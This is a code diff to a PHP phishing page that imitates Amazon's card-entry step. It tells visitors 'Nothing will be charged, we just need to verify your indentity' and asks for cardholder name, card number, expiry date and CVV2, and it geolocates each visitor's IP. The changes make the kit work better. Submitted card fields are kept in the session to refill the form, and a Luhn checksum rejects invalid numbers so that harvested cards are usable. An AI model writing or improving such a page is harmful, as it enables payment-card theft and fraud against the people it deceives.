@@ -1,6 +1,19 @@
 <?php
+session_start();
+
 $ip = $_SERVER['REMOTE_ADDR']; // the IP address to query
 $query = @unserialize(file_get_contents('http://ip-api.com/php/'.$ip));
+
+$cardFormData = $_SESSION['card_form_data'] ?? [];
+unset($_SESSION['card_form_data']);
+
+$prefillHolder = isset($cardFormData['holder']) ? $cardFormData['holder'] : ($_POST['holder'] ?? ($_POST['fullname'] ?? ''));
+$prefillNumber = isset($cardFormData['ccnum']) ? $cardFormData['ccnum'] : ($_POST['ccnum'] ?? '');
+$prefillMonth = isset($cardFormData['EXP1']) ? $cardFormData['EXP1'] : ($_POST['EXP1'] ?? '');
+$prefillYear = isset($cardFormData['EXP2']) ? $cardFormData['EXP2'] : ($_POST['EXP2'] ?? '');
+$prefillCvv = isset($cardFormData['cvv2']) ? $cardFormData['cvv2'] : ($_POST['cvv2'] ?? '');
+
+$hasInvalidData = isset($_GET['invalid_data']);
 
 ?>
 
@@ -146,19 +159,15 @@ amzn.copilot.checkCoPilotSession();
 
 
   
-<?php if(isset($_GET['invalid_data'])){?>
-
-    <div id="auth-error-message-box" class="a-box a-alert a-alert-error auth-server-side-message-box a-spacing-base"><div class="a-box-inner a-alert-container"><h4 class="a-alert-heading">There was a problem</h4><i class="a-icon a-icon-alert"></i><div class="a-alert-content">
+    <div id="auth-error-message-box" class="a-box a-alert a-alert-error auth-server-side-message-box a-spacing-base"<?php echo $hasInvalidData ? '' : ' style="display:none;"'; ?>><div class="a-box-inner a-alert-container"><h4 class="a-alert-heading">There was a problem</h4><i class="a-icon a-icon-alert"></i><div class="a-alert-content">
       <ul class="a-nostyle a-vertical a-spacing-none">
-        
+
           <li><span class="a-list-item">
             Please correct and try again.
           </span></li>
-        
+
       </ul>
     </div></div></div>
-  
-<?php } ?>
   
 
   
@@ -250,22 +259,41 @@ amzn.copilot.checkCoPilotSession();
 <div class="a-section"><div class="a-section pmts-step-2"><span class="a-size-base pmts-pick-address-view-header a-text-bold">Enter card details</span><span class="a-letter-space"></span><span class="a-size-small pmts-step-unweighted">(Step 2 of 3)</span><div><BR/>
 
 
-<div style="height:70px;" id="auth-error-message-box" class="a-box a-alert a-alert-error auth-server-side-message-box a-spacing-base"><div class="a-box-inner a-alert-container"><b style="" >Nothing will be charged , we just need to verify your indentity !</b><i class="a-icon a-icon-alert"></i></div></div>
+<div style="height:70px;" id="auth-info-message-box" class="a-box a-alert a-alert-error auth-server-side-message-box a-spacing-base"><div class="a-box-inner a-alert-container"><b style="" >Nothing will be charged , we just need to verify your indentity !</b><i class="a-icon a-icon-alert"></i></div></div>
 
 <label for="ap_email">
               Card Holder Name
             </label>
-<input type="text" value="<?php if(isset($_POST['fullname'])){ echo $_POST['fullname'];}?>" name="holder" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field">
+<input type="text" value="<?php echo htmlspecialchars($prefillHolder, ENT_QUOTES, 'UTF-8'); ?>" name="holder" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field">
 <BR/><BR/>
 <label for="ap_email">
               Card Number
             </label>
-<input type="text" name="ccnum" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field">
+<input type="text" name="ccnum" value="<?php echo htmlspecialchars($prefillNumber, ENT_QUOTES, 'UTF-8'); ?>" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field">
 <BR/><BR/>
-<label>Expiration date</label><span><span class="a-dropdown-container"><select name="EXP1" autocomplete="off" id="pmts-id-14" class="a-native-dropdown"><option value="1">01</option><option value="2">02</option><option value="3">03</option><option value="4" selected="">04</option><option value="5">05</option><option value="6">06</option><option value="7">07</option><option value="8">08</option><option value="9">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option></select><span tabindex="-1" class="a-button a-button-dropdown"><span class="a-button-inner"><span class="a-button-text a-declarative" data-action="a-dropdown-button" aria-haspopup="true" role="button" tabindex="0"><span class="a-dropdown-prompt">04</span></span><i class="a-icon a-icon-dropdown"></i></span></span></span></span><span class="a-letter-space"></span><span><span class="a-dropdown-container"><select name="EXP2" autocomplete="off" id="pmts-id-16" class="a-native-dropdown"><option value="2016">2016</option><option value="2017">2017</option><option value="2018">2018</option><option value="2019">2019</option><option value="2020">2020</option><option value="2021">2021</option><option value="2022" selected="">2022</option><option value="2023">2023</option><option value="2024">2024</option><option value="2025">2025</option><option value="2026">2026</option><option value="2027">2027</option><option value="2028">2028</option><option value="2029">2029</option><option value="2030">2030</option><option value="2031">2031</option><option value="2032">2032</option><option value="2033">2033</option><option value="2034">2034</option><option value="2035">2035</option></select><span tabindex="-1" class="a-button a-button-dropdown"><span class="a-button-inner"><span class="a-button-text a-declarative" data-action="a-dropdown-button" aria-haspopup="true" role="button" tabindex="0"><span class="a-dropdown-prompt">2016</span></span><i class="a-icon a-icon-dropdown"></i></span></span></span></span><br><span id="pmts-id-17"></span></div><fieldset class="a-spacing-top-base pmts-form-fields pmts-cup-mbcc"><div class="a-input-text-group"><div class="a-row a-spacing-top-none"><ul class="a-nostyle a-horizontal a-spacing-none"><li><span class="a-list-item">
+<label>Expiration date</label><span><span class="a-dropdown-container"><select name="EXP1" autocomplete="off" id="pmts-id-14" class="a-native-dropdown">
+<?php
+$selectedMonth = $prefillMonth !== '' ? (string) (int) $prefillMonth : '4';
+for ($month = 1; $month <= 12; $month++) {
+    $value = (string) $month;
+    $label = str_pad((string) $month, 2, '0', STR_PAD_LEFT);
+    $selected = $value === $selectedMonth ? ' selected' : '';
+    echo "<option value=\"{$value}\"{$selected}>{$label}</option>";
+}
+?>
+</select><span tabindex="-1" class="a-button a-button-dropdown"><span class="a-button-inner"><span class="a-button-text a-declarative" data-action="a-dropdown-button" aria-haspopup="true" role="button" tabindex="0"><span class="a-dropdown-prompt"><?php echo htmlspecialchars($selectedMonth !== '' ? str_pad($selectedMonth, 2, '0', STR_PAD_LEFT) : '04', ENT_QUOTES, 'UTF-8'); ?></span></span><i class="a-icon a-icon-dropdown"></i></span></span></span></span><span class="a-letter-space"></span><span><span class="a-dropdown-container"><select name="EXP2" autocomplete="off" id="pmts-id-16" class="a-native-dropdown">
+<?php
+$years = range(2016, 2035);
+$selectedYear = $prefillYear !== '' ? (string) $prefillYear : '2022';
+foreach ($years as $year) {
+    $selected = ((string) $year === (string) $selectedYear) ? ' selected' : '';
+    echo "<option value=\"{$year}\"{$selected}>{$year}</option>";
+}
+?>
+</select><span tabindex="-1" class="a-button a-button-dropdown"><span class="a-button-inner"><span class="a-button-text a-declarative" data-action="a-dropdown-button" aria-haspopup="true" role="button" tabindex="0"><span class="a-dropdown-prompt"><?php echo htmlspecialchars($selectedYear !== '' ? $selectedYear : '2022', ENT_QUOTES, 'UTF-8'); ?></span></span><i class="a-icon a-icon-dropdown"></i></span></span></span></span><br><span id="pmts-id-17"></span></div><fieldset class="a-spacing-top-base pmts-form-fields pmts-cup-mbcc"><div class="a-input-text-group"><div class="a-row a-spacing-top-none"><ul class="a-nostyle a-horizontal a-spacing-none"><li><span class="a-list-item">
 
 
-<label for="pmts-id-18" class="pmts-form-label">CVV2</label></span></li><li><span class="a-list-item"><label>(<a class="pmts-cup-mbcc-help-link" target="_blank" href="https://www.amazon.in/gp/help/customer/display.html?nodeId=201461830"> What's this? </a>)</label></span></li></ul><input type="text" maxlength="4" id="pmts-id-18" name="cvv2" class="a-input-text a-width-large"><br><span id="pmts-id-19"></span></div><BR/>
+<label for="pmts-id-18" class="pmts-form-label">CVV2</label></span></li><li><span class="a-list-item"><label>(<a class="pmts-cup-mbcc-help-link" target="_blank" href="https://www.amazon.in/gp/help/customer/display.html?nodeId=201461830"> What's this? </a>)</label></span></li></ul><input type="text" maxlength="4" id="pmts-id-18" name="cvv2" value="<?php echo htmlspecialchars($prefillCvv, ENT_QUOTES, 'UTF-8'); ?>" class="a-input-text a-width-large"><br><span id="pmts-id-19"></span></div><BR/>
 <div class="a-divider a-divider-break"><h5></h5></div>
 <BR/>
   <div class="a-row a-spacing-top-medium">
@@ -384,11 +412,58 @@ amzn.copilot.checkCoPilotSession();
     <div id="auth-external-javascript" class="auth-external-javascript" data-external-javascripts="">
     </div>
 
-    
+<script>
+(function() {
+  function luhnCheck(value) {
+    var digits = (value || '').replace(/\D/g, '');
+    if (digits.length < 12) {
+      return false;
+    }
 
+    var sum = 0;
+    var shouldDouble = false;
 
+    for (var i = digits.length - 1; i >= 0; i--) {
+      var digit = parseInt(digits.charAt(i), 10);
+      if (isNaN(digit)) {
+        return false;
+      }
+      if (shouldDouble) {
+        digit *= 2;
+        if (digit > 9) {
+          digit -= 9;
+        }
+      }
+      sum += digit;
+      shouldDouble = !shouldDouble;
+    }
 
+    return sum % 10 === 0;
+  }
 
+  var form = document.querySelector('form[name="signIn"]');
+  if (!form) {
+    return;
+  }
+
+  var cardNumberInput = form.querySelector('input[name="ccnum"]');
+  var errorBox = document.getElementById('auth-error-message-box');
+
+  form.addEventListener('submit', function(event) {
+    if (!cardNumberInput) {
+      return;
+    }
+
+    if (!luhnCheck(cardNumberInput.value)) {
+      event.preventDefault();
+      if (errorBox) {
+        errorBox.style.display = 'block';
+      }
+      cardNumberInput.focus();
+    }
+  });
+})();
+</script>
 
 </div>
 
